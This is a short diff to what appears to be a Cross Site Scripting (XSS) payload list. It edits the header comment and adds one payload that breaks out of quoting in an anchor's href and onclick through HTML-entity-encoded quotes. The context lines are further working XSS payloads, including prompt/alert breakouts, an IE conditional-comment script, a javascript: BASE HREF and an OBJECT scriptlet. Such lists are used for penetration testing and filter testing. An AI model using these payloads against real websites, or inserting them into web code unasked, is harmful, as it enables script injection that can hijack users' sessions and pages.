@@ -1,4 +1,4 @@
-<!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
+<!--Cross Site Scripting ( XSS ) Vulnerability Payload List -->
 
 "-prompt(8)-"
 '-prompt(8)-'
@@ -460,3 +460,4 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
 <BASE HREF="javascript:javascript:alert(1);//">
 <OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+<a id="author" href="http://foo?&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('http://foo?&apos;-alert(1)-&apos;');">dummy</a>
